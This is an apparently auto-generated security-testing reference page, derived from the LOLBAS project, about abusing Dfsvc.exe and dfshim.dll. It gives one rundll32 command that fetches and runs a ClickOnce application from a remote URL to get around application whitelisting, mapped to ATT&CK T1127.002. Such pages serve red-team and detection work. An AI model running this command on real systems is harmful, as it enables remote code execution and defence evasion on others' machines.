---
parsed_by: focuslocust
source: commands
type: generated
---
# Dfsvc Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Dfsvc.exe

Tool page: [Dfsvc.exe](../../tools/windows/dfsvc.exe.md)

### Use binary to bypass Application whitelisting

```text
rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
```

Description:

Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host)

Related ATT&CK:

- [T1127.002](../../attack/techniques/T1127.002-clickonce.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Dfsvc.yml` |
| Evidence | Command preserved from source parser. |
